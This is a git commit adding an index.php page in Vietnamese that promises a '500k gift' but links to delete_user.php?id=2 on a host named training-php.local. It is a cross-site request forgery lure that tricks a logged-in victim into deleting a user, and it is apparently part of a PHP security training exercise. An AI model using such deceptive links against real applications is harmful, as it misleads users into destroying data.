d96215baf6a2604a084d1a3a6f4568944c145a2f
DoTu <dominhtu81@gmail.com>
2022-10-20 14:43:53 +0700

    code hacker

---
+++ index.php
@@ -0,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nhận quà vip</title>
+</head>
+
+<body>
+    <div style="text-align:center;align-item:center;">
+        <h1 style="color:red;">Nhấp Vào Đây Nhận Quà 500k >>> </h1>
+
+        <a href="http://training-php.local/delete_user.php?id=2">>>> Nhận quà
+            <<<< </a>
+    </div>
+</body>
+
+</html>
